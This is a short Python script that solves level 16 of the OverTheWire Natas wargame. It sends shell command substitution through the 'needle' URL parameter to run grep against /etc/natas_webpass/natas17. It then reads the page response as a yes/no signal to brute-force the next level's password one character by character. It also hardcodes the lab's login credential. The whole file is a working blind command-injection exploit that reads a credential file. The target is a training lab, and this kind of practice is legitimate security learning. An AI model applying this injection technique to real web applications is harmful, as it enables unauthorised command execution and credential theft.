#!/usr/bin/env python
#thanks to http://www.abatchy.com/2016/11/natas-level-16 
import requests

url='http://natas16.natas.labs.overthewire.org/?needle=doomed$'
chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#all chars whitch can be 

filtered=''
passwd=''
auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
for char in chars:
	r = requests.get(url+'(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)
	if 'doomed' not in r.text :
	#catch is returning text containts text "exist" witch shows result is true
        	filtered = filtered + char
print filtered

for i in range(0,32):
	for char in filtered:
        	r = requests.get(url+'(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)
        	if 'doomed' not in r.text :
			passwd = passwd + char
			print(passwd)
			break

